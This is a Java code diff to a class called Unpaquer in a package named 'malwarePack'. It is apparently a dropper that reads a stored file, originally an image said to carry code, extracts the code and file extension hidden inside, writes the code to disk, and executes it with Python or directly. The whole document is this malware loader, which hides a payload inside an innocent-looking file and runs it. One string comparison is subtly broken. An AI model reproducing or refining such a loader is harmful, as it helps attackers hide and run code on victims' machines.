@@ -1,3 +1,4 @@
+package malwarePack;
 import java.io.*;
 
 public class Unpaquer {
@@ -45,18 +46,25 @@ public class Unpaquer {
 		return value;
 	}
 	public static void main(String args[]) throws IOException, InterruptedException{
-		Unpaquer unpaquer = new Unpaquer("DireccionDeImagenConCodigo");
+		
+		Unpaquer unpaquer = new Unpaquer("DireccionAlmacenamiento");
 		String s = unpaquer.reader();
 		String codigo = unpaquer.pop(s);
 		String extension = unpaquer.get(codigo, codigo.lastIndexOf("\n"));
-		String direccion = "DireccionImagenConCopdigo";
+		String direccion = "DireccionAlmacenamiento";
 		codigo = unpaquer.pop(extension.length(),codigo);
+		codigo = codigo.replaceAll("Ã¯Â¿Â¿", "");
 		File file = new File(direccion + extension);
 		System.out.println(codigo);
 		FileWriter writer = new FileWriter(file);
 		writer.write(codigo);
 		writer.close();
 		FileReader reader = new FileReader(file);
-		Runtime.getRuntime().exec("python "+file).waitFor();
-	}
+		if(extension == ".py" || extension == " .py") {
+			Runtime.getRuntime().exec("python "+file).waitFor();
+		}
+		else {
+			Runtime.getRuntime().exec("./"+file).waitFor();
+		}
+		}
 }
